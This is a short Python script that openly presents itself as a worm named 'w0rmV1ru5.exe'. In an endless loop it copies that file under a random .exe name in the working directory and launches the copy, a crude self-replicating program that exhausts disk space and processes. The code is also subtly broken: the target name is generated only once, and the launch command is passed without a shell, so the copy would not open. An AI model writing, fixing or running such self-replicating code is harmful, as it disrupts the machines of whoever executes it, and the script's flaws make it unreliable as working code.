import os
import shutil
import subprocess
import uuid
 
wormFileName = "w0rmV1ru5.exe"
fileDirectory = os.path.join(os.getcwd(), wormFileName)
targetirectory = os.path.join(os.getcwd(), (str (uuid.uuid4())) + ".exe")
 
while True:
    shutil.copyfile(fileDirectory, targetirectory)
    subprocess.run("xdg-open " + targetirectory)